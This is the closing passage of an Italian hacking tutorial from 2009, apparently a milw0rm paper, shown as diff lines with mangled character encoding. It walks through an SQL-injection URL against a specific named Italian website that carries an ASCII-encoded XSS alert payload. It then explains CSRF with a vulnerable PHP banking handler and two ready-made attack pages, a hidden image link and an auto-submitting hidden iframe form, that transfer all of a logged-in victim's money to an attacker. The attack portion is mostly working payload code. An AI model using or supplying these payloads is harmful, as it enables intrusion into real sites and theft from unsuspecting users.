+e vorremmo inserirla nell'SQL..ma ricordiamoci
+che dobbiamo convertirla in ASCII per far si che ritorni l'alert;
+quindi attraverso un normalissimo ASCII converter nel web la convertiamo in:
+
+60 115 99 114 105 112 116 62 97 108 101 114 116 40 39 120 115 115 98 121 88 97 68 111 83 39 
+
+41 60 115 99 114 105 112 116 62 
+
+bene.
+ora sfruttiamo un po' di conoscenze in ambito sql, cmoe sappiamo dovremo separare i numeri 
+
+da virgole, al posto degli spazi in questo modo:
+
+60,115,99,114,105,112,116,62,97,108,101,114,116,40,39,120,115,115,98,121,88,97,68,111,83,39,
+
+41,60,115,99,114,105,112,116,62 
+
+ora possiamo metterlo dentro il nostro comandino magico..
+
+char(60,83,67,82,73,80,84,62,97,108,101,114,116,40,39,120,115,115,98,121,120,97,100,111,115,
+
+39,41,60,47,115,99,114,105,112,116,62)
+
+ed ora..bhe, riprendiamo la nostra SQL
+ex.
+http://www.aslromah.it/news/home_notizia.php?ID_News=-99%20union%20all%20select%201,2,3,4,5,
+
+6,7,8,910,11,12--
+
+leggiamo il numero in cui printera i risultati, nel nostro caso il 4, ed inseriamo il codice 
+
+ascii.ORA dovremmo avere:
+
+http://www.aslromah.it/news/home_notizia.php?ID_News=-99%20union%20all%20select%201,2,3,char
+
+(60,83,67,82,73,80,84,62,97,108,101,114,116,40,39,120,115,115,98,121,120,97,100,111,115,39,4
+
+1,60,47,115,99,114,105,112,116,62),5,6,7,8,9,10,11,12--
+
+linkate..eh...puff
+appere il nostro alert dentro l'SQL. Semplicemente inutile ma.. divertente. 
+
+
+
+[!] CSRF o XSRF: Cross Site Request Forgery
+
+
+Ora che abbiamo concluso con le XSS vorrei presentare un attacco simile ma non certamente 
+
+uguale alle XSS, pi˘ potente Ë pi˘ dannoso per un ignara vittima.
+
+Innanzitutto bisogna capire la sostanziale differernza tra le XSS e le CSRF: Ë molto 
+
+semplice, mentre le Xss si basano sullo spingere un determinato user a cliccare su un url 
+
+maligna in modo tale da prelevare i suoi cookies o le sue informazioni di accesso ad un sito 
+
+web, Le CSRF si basano sullo sfruttamento di un user vittima che, essendo loggato ad un 
+
+determinato sito, ci permette di eseguire codici maligni attraverso il suo stesso account. 
+
+Proprio per questo Ë una tecnica pi˘ difficile da individuare ed eliminare per un admin, 
+
+poichË tutte le azioni commesse risulteranno eseguite da un user qualunque(la nostra 
+
+vittima,che non sospetta di nulla).
+
+Riassumendo quindi le Cross Site Request Forgery ci permettono di spedire qualunque tipo di 
+
+richiesta HTTP ad un sito attraverso una specifica vittima che compier‡ ogni azione per noi 
+
+a suo discapito.
+
+Vediamo ora pi˘ nel dettaglio questo tipo di tecnica:
+
+Ipotizziamo( e scrivo ipotizziamo perchË se fosse cosÏ semplice sarei miliardario) che un 
+
+utente Ë loggato ad un sito che permette di avere alcuni servizi speciali quali il possesso 
+
+di un conto bancario ed il trasferimento di soldi ($.$).
+Avendo quindi un normale account il sito permette a questa persona di eseguire alcune 
+
+transazioni monetarie.
+Il codice quindi di una pagina per trasferire soldi in un servizio di e-banking potrebbe 
+
+essere in generale: 
+
+&lt;form method=&quot;POST&quot; action=&quot;spediscoeuro.php&quot; name=&quot;spediscoeuro&quot;&gt;
+        &lt;div&gt;Quanto trasferisci: &lt;input type=&quot;text&quot; name=&quot;euro&quot;&gt;&lt;/div&gt;
+        &lt;div&gt;A:   &lt;input type=&quot;text&quot; name=&quot;toname&quot;&gt;&lt;/div&gt;
+        &lt;div&gt;lol: &lt;input type=&quot;text&quot; name=&quot;tolol&quot;&gt;&lt;/div&gt;
+        &lt;div&gt;asd: &lt;input type=&quot;text&quot; name=&quot;toasd&quot;&gt;&lt;/div&gt;
+        &lt;div&gt;omg: &lt;input type=&quot;text&quot; name=&quot;toomg&quot;&gt;&lt;/div&gt;
+        &lt;div&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Buy&quot;&gt;&lt;/div&gt;
+     &lt;/form&gt;
+
+attraverso queste righe un user puÚ trasferire denare su un diverso account bancario (nella 
+
+realt‡ non Ë cosÏ semplice ma Ë solo per farvi capire)
+
+Quando l'utente spedisce la richiesta la pagina spediscieuro.php eseguir‡ il trasferimento, 
+
+attraverso un codice del tipo:
+
+/* spediscieuro.php */
+     &lt;?
+     session_start();
+     if(isset($_REQUEST['euro']))
+          $euro = $_REQUEST['euro'];
+     else
+          die(&quot;Specificare la somma di denar0!&quot;); //toname sarebbe l'account destinatario , 
+
+quello che riceve la somma
+     if(isset($_REQUEST['toname']))
+          $toname = $_REQUEST['toname'];
+     else
+          die(&quot;Specificare dove trasferire la somma&quot;);
+     if(isset($_REQUEST['tolol']))
+          $toabi = $_REQUEST['tolol'];
+     else
+          die(&quot;specificare lol&quot;);
+     if(isset($_REQUEST['toasd']))
+          $tocab = $_REQUEST['toasd'];
+     else
+          die(&quot;Specificare asd&quot;);
+     if(isset($_REQUEST['toomg']))
+          $tocin = $_REQUEST['toomg'];
+     else
+          die(&quot;Specificare omg&quot;);
+     
+     
+     send_money($euro, $toname, $tolol, $toasd, $toomg);
+      
+     ?&gt; 
+
+
+Ora un attaccante, grazie ai REQUEST potrebbe usufruire di richieste GET maligne, per 
+
+spedire i soldi in un determinato posto , rubandoli.
+Ora arriva la parte importante:
+Noi attaccanti dobbiamo riuscire a dirigere l'utente, mentre Ë loggato alla banca, su una 
+
+pagina web nostra o anche su un immagine o video..
+esempio:(mentre l'utente sta guardando il suo ammontare per esempio..)
+ATTACCANTE:&quot;Vieni a vedere questa bellssima foto! Link: http://sitonostro/immagine.html&quot;
+
+Ora la pagina ../immagine.html dovrebbe essere struttura pi˘ o meno cosÏ:
+
+
+
+   &lt;html&gt;
+    &lt;head&gt;&lt;title&gt;Immagine bellissima&lt;/title&gt;&lt;/head&gt;
+    &lt;body&gt;
+ &lt;img 
+
+src=&quot;http://bancavittima.it/spediscieuro.php?euro=TUTTI&amp;toname=HACKER&amp;tolol=123456&amp;toasd=123
+
+456&amp;toomg=X&quot;&gt;
+    &lt;/body&gt;
+   &lt;/html&gt;
+
+
+Come potete osservare da soli, l'utente mentre guarda l'immagine bellissima Ë 
+
+contemporaneamente collegato alla banca ed eseguir‡ ignaro di tutto un trasferimento di 
+
+TUTTI i suoi soldi verso HACKER(attaccante). Ora avete capito? qui sta la bellezza di questi 
+
+tipi di attacco: Ë l'utente che tramite i suoi cookie e il suo account esegue richieste HTTP 
+
+pi˘ o meno dannose per noi(in questo caso direi m0lto dannose!!).
+
+
+Ora, probabilmente nessuna banca Ë cosÏ stupida da usare richieste come REQUEST ma 
+
+probabilmente userebbe per un transito monetario richieste POST. In questo caso la nostra 
+
+pagina immagine.html sarebbe diventata:
+
+
+     &lt;html&gt;
+     &lt;head&gt;
+     &lt;title&gt;Immagine bellissima&lt;/title&gt;
+     &lt;script&gt;
+     rubaeuro() {
+          iframe = document.frames[&quot;rubaeuro&quot;];
+          iframe.document.ruba.submit();
+     }
+     &lt;/head&gt;
+     &lt;body onload=&quot;rubaeuro()&quot;&gt;
+     &lt;div&gt;&lt;img src=&quot;immagine_vera_bellissima.jpg&quot;&gt;&lt;/div&gt;
+     &lt;iframe name=&quot;rubaeuro&quot; display=&quot;none&quot;&gt;
+          &lt;form method=&quot;POST&quot; name=&quot;ruba&quot;
+           action=&quot;http://bancavittima.com/spediscieuro.php&quot;&gt;
+               &lt;input type=&quot;hidden&quot; name=&quot;euro&quot; value=&quot;TUTTI&quot;&gt;
+               &lt;input type=&quot;hidden&quot; name=&quot;toname&quot; value=&quot;HACKER&quot;&gt;
+               &lt;input type=&quot;hidden&quot; name=&quot;tolol&quot; value=&quot;123456&quot;&gt;
+               &lt;input type=&quot;hidden&quot; name=&quot;toasd&quot; value=&quot;123456&quot;&gt;
+               &lt;input type=&quot;hidden&quot; name=&quot;toomg&quot; value=&quot;X&quot;&gt;
+          &lt;/form&gt;
+     &lt;/iframe&gt;
+     &lt;/body&gt;
+     &lt;/html&gt;
+
+
+iniziate a capire da soli vero ;-) ?
+Attraverso la sessione ATTIVA dell'utente alla banca eseguiamo le nostre richieste di 
+
+trasferimento !
+Questo era solo un esempio per farvi capire la pericolosit‡ di un bug del genere in siti di 
+
+e-banking o simili.
+
+
+
+
+
+
+
+
+[+]P0st_fazione + Ringraziamenti
+
+Dopo questo paper spero esauriente, forse inizierete a capire che la gente spesso 
+
+sottovaluta troppo vulnerabilit‡ come XSS &amp; CSRF ..credendo che un SQL o una RFI siano 
+
+migliori, ma senza capire che la dove non sar‡ possibile eseguire una stupida sql su 
+
+index.php?id=[sql] bisogner‡ affidarsi a vulnerabilit‡ pi˘ sottili, che richiedono molta pi˘ 
+
+astuzia ed ingegno.
+
+
+th4nks to: 
+
+Langy / Xylitol / Nexus / Uber0n / GsC / plucky / Osyris / security-sh3ll / Security Code 
+
+Team / Infernet / R4zor_CrasH / xssed / xssing / DoMin0 /
+Inj3ct-it 
+
+# milw0rm.com [2009-08-07]</pre>
+</html>
